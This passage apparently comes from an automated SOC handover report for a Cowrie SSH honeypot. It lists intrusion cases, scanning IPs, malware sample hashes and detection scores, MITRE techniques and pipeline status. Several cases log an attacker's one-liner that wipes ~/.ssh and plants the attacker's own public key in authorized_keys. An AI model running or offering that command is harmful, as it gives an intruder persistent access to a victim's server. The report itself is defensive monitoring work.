| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:43:04` | `cowrie.session.connect` |
| `2026-06-02 23:43:04` | `cowrie.client.version` |
| `2026-06-02 23:43:05` | `cowrie.client.kex` |
| `2026-06-02 23:43:05` | `cowrie.login.success` |
| `2026-06-02 23:43:06` | `cowrie.session.params` |
| `2026-06-02 23:43:06` | `cowrie.command.input` |
| `2026-06-02 23:43:06` | `cowrie.command.failed` |
| `2026-06-02 23:43:06` | `cowrie.log.closed` |
| `2026-06-02 23:43:07` | `cowrie.session.params` |
| `2026-06-02 23:43:07` | `cowrie.command.input` |
| `2026-06-02 23:43:07` | `cowrie.session.file_download` |
| `2026-06-02 23:43:07` | `cowrie.log.closed` |
| `2026-06-02 23:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e345ab3ecb

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-06-02 23:43 |
| **Last Seen** | 2026-06-02 23:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:43:10` | `cowrie.session.connect` |
| `2026-06-02 23:43:10` | `cowrie.client.version` |
| `2026-06-02 23:43:11` | `cowrie.client.kex` |
| `2026-06-02 23:43:12` | `cowrie.login.success` |
| `2026-06-02 23:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-865ec704f392

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:47 |
| **Last Seen** | 2026-06-02 23:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:47:14` | `cowrie.session.connect` |
| `2026-06-02 23:47:14` | `cowrie.client.version` |
| `2026-06-02 23:47:14` | `cowrie.client.kex` |
| `2026-06-02 23:47:14` | `cowrie.login.success` |
| `2026-06-02 23:47:14` | `cowrie.session.params` |
| `2026-06-02 23:47:14` | `cowrie.command.input` |
| `2026-06-02 23:47:14` | `cowrie.command.failed` |
| `2026-06-02 23:47:15` | `cowrie.log.closed` |
| `2026-06-02 23:47:15` | `cowrie.session.params` |
| `2026-06-02 23:47:15` | `cowrie.command.input` |
| `2026-06-02 23:47:15` | `cowrie.session.file_download` |
| `2026-06-02 23:47:15` | `cowrie.log.closed` |
| `2026-06-02 23:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b77b773310

| Field | Detail |
|---|---|
| **Source IP** | `194.163.172[.]121` |
| **First Seen** | 2026-06-02 23:47 |
| **Last Seen** | 2026-06-02 23:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:47:17` | `cowrie.session.connect` |
| `2026-06-02 23:47:17` | `cowrie.client.version` |
| `2026-06-02 23:47:17` | `cowrie.client.kex` |
| `2026-06-02 23:47:18` | `cowrie.login.success` |
| `2026-06-02 23:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.172[.]121` to AbuseIPDB if not already reported
- [ ] Block `194.163.172[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-566e32e98feb

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-06-02 23:47 |
| **Last Seen** | 2026-06-02 23:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:47:42` | `cowrie.session.connect` |
| `2026-06-02 23:47:42` | `cowrie.client.version` |
| `2026-06-02 23:47:43` | `cowrie.client.kex` |
| `2026-06-02 23:47:43` | `cowrie.login.success` |
| `2026-06-02 23:47:44` | `cowrie.session.params` |
| `2026-06-02 23:47:44` | `cowrie.command.input` |
| `2026-06-02 23:47:44` | `cowrie.command.failed` |
| `2026-06-02 23:47:44` | `cowrie.log.closed` |
| `2026-06-02 23:47:44` | `cowrie.session.params` |
| `2026-06-02 23:47:44` | `cowrie.command.input` |
| `2026-06-02 23:47:45` | `cowrie.session.file_download` |
| `2026-06-02 23:47:45` | `cowrie.log.closed` |
| `2026-06-02 23:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef1f7608843e

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-06-02 23:47 |
| **Last Seen** | 2026-06-02 23:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:47:48` | `cowrie.session.connect` |
| `2026-06-02 23:47:49` | `cowrie.client.version` |
| `2026-06-02 23:47:49` | `cowrie.client.kex` |
| `2026-06-02 23:47:50` | `cowrie.login.success` |
| `2026-06-02 23:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.64.168[.]136` | **32** | 2026-06-02 22:17 | 2026-06-02 22:56 | 57m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.186.18[.]243` | **31** | 2026-06-02 21:09 | 2026-06-02 21:31 | 42m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `203.83.234[.]180` | **30** | 2026-06-02 21:05 | 2026-06-02 21:48 | 45m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `87.106.29[.]151` | **30** | 2026-06-02 22:19 | 2026-06-02 23:12 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `95.167.225[.]76` | **30** | 2026-06-02 22:40 | 2026-06-02 23:28 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.253.156[.]184` | **29** | 2026-06-02 21:00 | 2026-06-02 21:56 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `86.98.113[.]226` | **29** | 2026-06-02 22:25 | 2026-06-02 23:33 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `104.208.108[.]166` | **28** | 2026-06-02 20:54 | 2026-06-02 21:49 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.171.69[.]82` | **24** | 2026-06-02 22:29 | 2026-06-02 23:43 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.123[.]65` | **22** | 2026-06-02 21:01 | 2026-06-02 21:47 | 36m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.221.232[.]44` | **22** | 2026-06-02 20:54 | 2026-06-02 21:43 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `42.200.66[.]164` | **21** | 2026-06-02 20:53 | 2026-06-02 21:30 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `109.206.241[.]199` | **20** | 2026-06-02 21:06 | 2026-06-02 21:45 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.167.38[.]71` | **18** | 2026-06-02 22:39 | 2026-06-02 23:16 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `50.116.72[.]139` | **13** | 2026-06-02 20:53 | 2026-06-02 21:11 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `161.35.65[.]86` | **10** | 2026-06-02 20:53 | 2026-06-02 21:08 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `54.37.74[.]179` | **10** | 2026-06-02 20:54 | 2026-06-02 21:09 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `194.163.172[.]121` | **6** | 2026-06-02 23:25 | 2026-06-02 23:47 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `49.64.85[.]138` | **6** | 2026-06-02 22:16 | 2026-06-02 22:23 | 8m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `125.138.175[.]113` | **4** | 2026-06-02 22:35 | 2026-06-02 22:47 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `81.193.216[.]17` | **4** | 2026-06-02 23:39 | 2026-06-02 23:47 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `45.78.198[.]177` | **3** | 2026-06-02 20:58 | 2026-06-02 21:07 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.152.209[.]0` | **3** | 2026-06-02 23:19 | 2026-06-02 23:23 | 6m | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]25` | **2** | 2026-06-02 23:35 | 2026-06-02 23:37 | 4m | 0 | `T1592` | 🟢 LOW |
| `43.226.47[.]99` | **2** | 2026-06-02 23:24 | 2026-06-02 23:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.116.224[.]143` | **2** | 2026-06-02 23:44 | 2026-06-02 23:47 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.214.179[.]202` | 1 | 2026-06-02 21:02 | 2026-06-02 21:02 | 31s | 0 | `T1592` | 🟢 LOW |
| `101.126.24[.]71` | 1 | 2026-06-02 23:44 | 2026-06-02 23:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.171.69[.]71` | 1 | 2026-06-02 23:06 | 2026-06-02 23:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.171.69[.]76` | 1 | 2026-06-02 22:57 | 2026-06-02 22:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.171.69[.]77` | 1 | 2026-06-02 23:19 | 2026-06-02 23:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.171.69[.]83` | 1 | 2026-06-02 23:14 | 2026-06-02 23:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.171.69[.]84` | 1 | 2026-06-02 22:50 | 2026-06-02 22:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.171.69[.]93` | 1 | 2026-06-02 23:38 | 2026-06-02 23:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.68.98[.]152` | 1 | 2026-06-02 22:09 | 2026-06-02 22:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.50.51[.]198` | 1 | 2026-06-02 22:19 | 2026-06-02 22:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.35.127[.]66` | 1 | 2026-06-02 22:01 | 2026-06-02 22:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.96.157[.]188` | 1 | 2026-06-02 22:17 | 2026-06-02 22:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.28.109[.]188` | 1 | 2026-06-02 23:44 | 2026-06-02 23:44 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.122.36[.]17` | 1 | 2026-06-02 23:37 | 2026-06-02 23:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]84` | 1 | 2026-06-02 22:31 | 2026-06-02 22:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]197` | 1 | 2026-06-02 21:11 | 2026-06-02 21:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.73[.]80` | 1 | 2026-06-02 22:35 | 2026-06-02 22:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.203.20[.]239` | 1 | 2026-06-02 23:06 | 2026-06-02 23:06 | 4s | 0 | `T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-06-02 20:54 | 2026-06-02 20:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.180.32[.]104` | 1 | 2026-06-02 22:28 | 2026-06-02 22:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.140.123[.]130` | 1 | 2026-06-02 23:17 | 2026-06-02 23:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.27.18[.]80` | 1 | 2026-06-02 20:56 | 2026-06-02 20:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.240.156[.]16` | 1 | 2026-06-02 22:16 | 2026-06-02 22:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.76.136[.]25` | 1 | 2026-06-02 21:00 | 2026-06-02 21:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.154.0[.]104` | 1 | 2026-06-02 20:56 | 2026-06-02 20:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `93.40.0[.]123` | 1 | 2026-06-02 23:33 | 2026-06-02 23:33 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 39/100 | 🟢 LOW | **24/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 38/100 | 🟢 LOW | **20/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 37/100 | 🟢 LOW | **19/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `86.98.113[.]226` | AE | SKY CITY INTERNET | **100** ⚠️ | 3 |
| `103.171.69[.]66` | BD | Multilink International | **100** ⚠️ | 1 |
| `103.171.69[.]84` | BD | Multilink International | **100** ⚠️ | 3 |
| `50.116.72[.]139` | US | WEBSITEWELCOME.COM (gator1711.hostgator.com) | **100** ⚠️ | 30 |
| `61.76.136[.]25` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `72.167.38[.]71` | US | GoDaddy.com, LLC | **100** ⚠️ | 5 |
| `125.138.175[.]113` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `1.214.179[.]202` | KR | LG Uplus | **100** ⚠️ | 37 |
| `8.152.209[.]0` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 50 |
| `203.83.234[.]180` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 667 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 317 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 239 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 121 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 121 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 703 cases |
| Tool 34  | Credential Extractor        | ✅ 556 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (1.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 239 priority case(s) shown individually · 52 recon entry/entries in table (26 group(s) consolidating 431 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-02T23:50:04Z_
